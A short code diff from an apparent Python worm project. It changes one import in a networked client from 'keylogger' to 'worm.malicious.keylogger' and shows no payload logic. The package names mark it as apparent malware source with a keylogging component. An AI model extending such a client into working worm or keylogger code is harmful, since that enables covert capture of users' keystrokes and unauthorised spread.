@@ -13,7 +13,7 @@ import threading
 import uuid
 from socket import socket, error, AF_INET, SOCK_STREAM
 from worm.clnt.constants import EXIT, CLIENT_IP, PORT, NO_DATA, CHARS, FIRST, RANGE_POS_1, RANGE_POS_2, RANGE_POS_3
-import keylogger
+import worm.malicious.keylogger
 from worm.clnt.protocol import Protocol
 
 
